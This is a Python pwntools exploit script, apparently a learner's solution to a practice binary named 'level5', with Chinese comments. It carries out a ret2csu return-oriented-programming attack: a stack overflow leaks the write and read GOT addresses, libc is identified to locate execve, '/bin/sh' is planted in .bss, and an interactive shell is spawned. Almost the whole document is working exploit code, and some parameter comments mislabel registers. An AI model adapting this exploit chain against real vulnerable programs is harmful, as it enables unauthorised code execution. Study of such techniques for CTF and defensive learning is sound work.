from pwn import *
from LibcSearcher import LibcSearcher

gadget_csu = 0x0040061a
gadget_func = 0x00400600

def print_addr(sh, addr ,size):
    ## 打印一下 bss 段内容看看情况
    payload1 = craft_ret2csu_payload(gadget_csu, # gadget csu
                                    gadget_func, # 0x004005ec, # gadget func
                                    0,          # rbx
                                    1,          # rbp
                                    l5.got["write"],  # r12 write.got
                                    1,          # para1 stdout
                                    addr,  # para2 buffer 6278066737626506568
                                    size,          # para3 size
                                    main # ret
                                    )

    sh.send(payload1)

    # 读取完 Helloworld 这一串输出，但是很奇怪这里读取到的是 'orld\n'
    log.warn(sh.recv())


def craft_ret2csu_payload(csu_gadget_addr, func_gadget_addr, rbx, rbp, r12, r15, r14, r13, last):
    # This function assumes that the 'csu_gadget_addr' pops the values into the registers
    # and then calls the function pointer at 'func_gadget_addr', which will use those register
    # values to perform the operation.

    # Padding to reach the return address, assuming a buffer overflow at 128 bytes
    # plus 8 bytes for the saved RBP (this may need to be adjusted for your specific binary)
    payload = b"a" * 128 + b'b'*8

    # Add the CSU gadget address
    payload += p64(csu_gadget_addr)

    # Values to be popped into registers by the CSU gadget
    payload += p64(rbx)   # rbx value to be popped into rbx register
    payload += p64(rbp)   # rbp value to be popped into rbp register
    payload += p64(r12)   # r12 value to be popped into r12 register (will be used in the call)
    # 一定要注意这里的参数是反着的
    payload += p64(r13)   # r13 value to be popped into rdi register
    payload += p64(r14)   # r14 value to be popped into rsi register
    payload += p64(r15)   # r15 value to be popped into rdx register

    # Add the 'func_gadget_addr' which will call the function at [r12 + rbx*8]
    payload += p64(func_gadget_addr)

    # Extra padding needed between 'func_gadget_addr' and the 'last' address
    # The exact amount should be determined by the specifics of the gadgets used
    # This often includes padding for any additional pops that may occur in the gadgets
    # For this example, I am using '7 * 8' to account for 7 potential pops
    # This may need to be adjusted based on the specific gadgets you are using.
    payload += b"c" * 56

    # The address to return to after the function call is complete
    payload += p64(last)

    return payload

if __name__ == '__main__':
    context.log_level = 'debug'
    # sh = gdb.debug('./level5', "b *0x400586")
    l5 = ELF('./level5')
    bin_sh_offset = 0x1382e8
    main = l5.symbols['main']

    # step1: 获取 write 的 GOT 地址
    # write(1, write_got, 8)
    payload1 = craft_ret2csu_payload(gadget_csu, # gadget csu
                                     gadget_func, # 0x004005ec, # gadget func
                                     0,          # rbx
                                     1,          # rbp
                                     l5.got["write"],  # r12 write.got
                                     1,          # para1 stdout
                                     l5.got["write"],  # para2 buffer 6278066737626506568
                                     8,          # para3 size
                                     main # ret
                                     )

    sh = process('./level5')

    log.info(sh.recv())
    sh.send(payload1)

    # 确定了 libc 版本为 libc6-amd64_2.13-0ubuntu13.2_i386
    write_addr = u64(sh.recv(8))
    log.success(f'write addr {write_addr}')

    # write(1, write_got, 8)
    payload1 = craft_ret2csu_payload(gadget_csu, # gadget csu
                                     gadget_func, # 0x004005ec, # gadget func
                                     0,          # rbx
                                     1,          # rbp
                                     l5.got["write"],  # r12 write.got
                                     1,          # para1 stdout
                                     l5.got["read"],  # para2 buffer 6278066737626506568
                                     8,          # para3 size
                                     main # ret
                                     )

    ############# 这一行出大问题
    ##############sh = process('./level5')

    log.info(sh.recv())
    sh.send(payload1)

    # 确定了 libc 版本为 libc6-amd64_2.13-0ubuntu13.2_i386
    read_addr = u64(sh.recv(8))
    log.success(f'read addr {read_addr}')

    # 读取完 Helloworld 这一串输出，但是很奇怪这里读取到的是 'orld\n'
    log.info(sh.recv())

    # step2: 获取 execve 在程序中的真实地址，这里选择前两个都行，后面的没试
    # 0 - libc6_2.37-12_amd64
    # 1 - libc6-amd64_2.37-11_i386
    # 2 - libc6_2.37-11_amd64
    # 3 - libc6-amd64_2.37-12_i386
    libc = LibcSearcher('write', write_addr)
    libc.add_condition('read', read_addr)
    # libc = ELF('./libc6-amd64_2.13-0ubuntu13.2_i386.so')
    # execve_offset = libc.symbols['execve']  # execve在libc中的偏移量
    # libc_base = write_addr - libc.symbols['write']  # 计算出libc的基址
    execve_offset = libc.dump('execve')  # execve在libc中的偏移量
    libc_base = write_addr - libc.dump('write')  # 计算出libc的基址
    execve_addr = libc_base + execve_offset  # 通过偏移量计算execve的实际地址
    log.success(f'execve addr: {execve_addr}')

    # 打印一下 bss 看看情况
    print_addr(sh, l5.bss(), 16)

    # step3: 构造 /bin/sh
    bss_addr = l5.bss()
    log.success(f'bss addr: {bss_addr}')
    # read(0, bss_base, 16)
    payload2 = craft_ret2csu_payload(gadget_csu, # gadget csu
                                     gadget_func, # gadget func
                                     0,          # rbx
                                     1,          # rbp
                                     l5.got['read'],  # r12 write.got
                                     0,          # r13 stdin
                                     bss_addr,  # r14 write to bss
                                     16,          # r15 read size
                                     main # ret
                                     )
    sh.send(payload2)
    sleep(1)
    sh.send(p64(execve_addr) + b'/bin/sh\0')
    log.info(sh.recv())

    # 打印一下 bss 看看情况
    sleep(1)
    print_addr(sh, l5.bss(), 16)

    # step4: 执行
    log.success('Write to bss')
    payload3 = craft_ret2csu_payload(gadget_csu, # gadget csu
                                     gadget_func, # gadget func
                                     0,          # rbx
                                     1,          # rbp
                                     bss_addr,  # r12 target to call
                                     bss_addr+8,          # r13 stdin
                                     0,  # r14 write to bss
                                     0,          # r15 read size
                                     main # ret
                                     )
    sh.send(payload3)
    sh.interactive()
